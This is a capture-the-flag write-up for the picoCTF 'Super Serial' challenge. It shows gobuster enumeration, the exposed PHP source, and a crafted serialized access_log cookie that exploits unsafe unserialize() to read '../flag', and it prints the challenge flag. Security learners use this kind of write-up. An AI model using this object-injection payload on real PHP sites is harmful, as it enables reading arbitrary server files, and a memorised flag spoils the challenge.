# Super Serial
#### Write-up author: [jon-brandy](https://github.com/jon-brandy)
## DESCRIPTION:
Try to recover the flag stored on this website http://mercury.picoctf.net:25395/
## HINT:
The flag is at ../flag
## STEPS:
1. First, open the website given.
2. For this solution i used `gobuster` to check hidden directory from this website.
3. Run this command:

```bash
gobuster dir -e -u http://mercury.picoctf.net:25395/ -w /usr/share/wordlists/dirb/common.txt
```
> OUTPUT:

![image](https://user-images.githubusercontent.com/70703371/179447007-accc6d10-6c10-4ffe-8971-5537fa6a3893.png)

![image](https://user-images.githubusercontent.com/70703371/179447083-0970fc86-afc8-4940-bd37-375570ca7cfa.png)

4. Now let's open `robots.txt` by change the url to this `http://mercury.picoctf.net:25395/robots.txt`.

> OUTPUT:

![image](https://user-images.githubusercontent.com/70703371/179447163-dbb17cf7-003e-4e1d-8a79-fc10c352af66.png)

5. Now go to the `admin.phps` by change the url to this -> `http://mercury.picoctf.net:25395/robots.txt/admin.phps/`

> OUTPUT:

![image](https://user-images.githubusercontent.com/70703371/179447321-0e4e9b97-7c18-47e1-8aea-37b756bd5b7e.png)

6. Let's go to the other file -> `index.phps` by change the url to this -> `http://mercury.picoctf.net:25395/index.phps` and open the `page source`.

```php
<?php
require_once("cookie.php");

if(isset($_POST["user"]) && isset($_POST["pass"])){
	$con = new SQLite3("../users.db");
	$username = $_POST["user"];
	$password = $_POST["pass"];
	$perm_res = new permissions($username, $password);
	if ($perm_res->is_guest() || $perm_res->is_admin()) {
		setcookie("login", urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), "/");
		header("Location: authentication.php");
		die();
	} else {
		$msg = '<h6 class="text-center" style="color:red">Invalid Login.</h6>';
	}
}
?>

<!DOCTYPE html>
<html>
<head>
<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
<link href="style.css" rel="stylesheet">
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
</head>
	<body>
		<div class="container">
			<div class="row">
				<div class="col-sm-9 col-md-7 col-lg-5 mx-auto">
					<div class="card card-signin my-5">
						<div class="card-body">
							<h5 class="card-title text-center">Sign In</h5>
							<?php if (isset($msg)) echo $msg; ?>
							<form class="form-signin" action="index.php" method="post">
								<div class="form-label-group">
									<input type="text" id="user" name="user" class="form-control" placeholder="Username" required autofocus>
									<label for="user">Username</label>
								</div>

								<div class="form-label-group">
									<input type="password" id="pass" name="pass" class="form-control" placeholder="Password" required>
									<label for="pass">Password</label>
								</div>

								<button class="btn btn-lg btn-primary btn-block text-uppercase" type="submit">Sign in</button>
							</form>
						</div>
					</div>
				</div>
			</div>
		</div>
	</body>
</html>
```

7. We got clue, there's 2 `.php` file, namely `cookie.php` and `authentication.php`, let's go there by adding the `s` character behind it.
8. First, i went to `cookie.phps`.

```php
<?php
session_start();

class permissions
{
	public $username;
	public $password;

	function __construct($u, $p) {
		$this->username = $u;
		$this->password = $p;
	}

	function __toString() {
		return $u.$p;
	}

	function is_guest() {
		$guest = false;

		$con = new SQLite3("../users.db");
		$username = $this->username;
		$password = $this->password;
		$stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
		$stm->bindValue(1, $username, SQLITE3_TEXT);
		$stm->bindValue(2, $password, SQLITE3_TEXT);
		$res = $stm->execute();
		$rest = $res->fetchArray();
		if($rest["username"]) {
			if ($rest["admin"] != 1) {
				$guest = true;
			}
		}
		return $guest;
	}

        function is_admin() {
                $admin = false;

                $con = new SQLite3("../users.db");
                $username = $this->username;
                $password = $this->password;
                $stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
                $stm->bindValue(1, $username, SQLITE3_TEXT);
                $stm->bindValue(2, $password, SQLITE3_TEXT);
                $res = $stm->execute();
                $rest = $res->fetchArray();
                if($rest["username"]) {
                        if ($rest["admin"] == 1) {
                                $admin = true;
                        }
                }
                return $admin;
        }
}

if(isset($_COOKIE["login"])){
	try{
		$perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
		$g = $perm->is_guest();
		$a = $perm->is_admin();
	}
	catch(Error $e){
		die("Deserialization error. ".$perm);
	}
}

?>

```

9. If you read carefully, you can see there's a deserializer. Let's remember that!

```php
if(isset($_COOKIE["login"])){
	try{
		$perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
		$g = $perm->is_guest();
		$a = $perm->is_admin();
	}
	catch(Error $e){
		die("Deserialization error. ".$perm);
	}
}

```

10. Next, i opened the `authentication.phps`. 

```php
<?php

class access_log
{
	public $log_file;

	function __construct($lf) {
		$this->log_file = $lf;
	}

	function __toString() {
		return $this->read_log();
	}

	function append_to_log($data) {
		file_put_contents($this->log_file, $data, FILE_APPEND);
	}

	function read_log() {
		return file_get_contents($this->log_file);
	}
}

require_once("cookie.php");
if(isset($perm) && $perm->is_admin()){
	$msg = "Welcome admin";
	$log = new access_log("access.log");
	$log->append_to_log("Logged in at ".date("Y-m-d")."\n");
} else {
	$msg = "Welcome guest";
}
?>

<!DOCTYPE html>
<html>
<head>
<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
<link href="style.css" rel="stylesheet">
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
</head>
	<body>
		<div class="container">
			<div class="row">
				<div class="col-sm-9 col-md-7 col-lg-5 mx-auto">
					<div class="card card-signin my-5">
						<div class="card-body">
							<h5 class="card-title text-center"><?php echo $msg; ?></h5>
							<form action="index.php" method="get">
								<button class="btn btn-lg btn-primary btn-block text-uppercase" type="submit" onclick="document.cookie='user_info=; expires=Thu, 01 Jan 1970 00:00:18 GMT; domain=; path=/;'">Go back to login</button>
							</form>
						</div>
					</div>
				</div>
			</div>
		</div>
	</body>
</html>

```

11. The access_log object is the vuln, because we can create an access_log object that will read "../flag", pass it to the deserialzer then encode it with base64 and pass it into the login cookie to trigger the deserialization error, then the flag will be given to us. 

12. Using this online [editor](https://onlinephp.io/), paste this code below, then click execute:

```php
<?php

class access_log
{
	public $log_file = "../flag";
}

print(urlencode(base64_encode(serialize(new access_log))))

?>
```

> OUTPUT:

```
TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9
```

13. Copy the output and paste it as new cookie at this website -> `http://mercury.picoctf.net:25395/authentication.php`

![image](https://user-images.githubusercontent.com/70703371/179663888-9f31295d-7289-4486-a02c-29a90e3a90b0.png)

15. Finally we got the flag!

---
## FLAG

```
picoCTF{th15_vu1n_1s_5up3r_53r1ous_y4ll_405f4c0e}
```
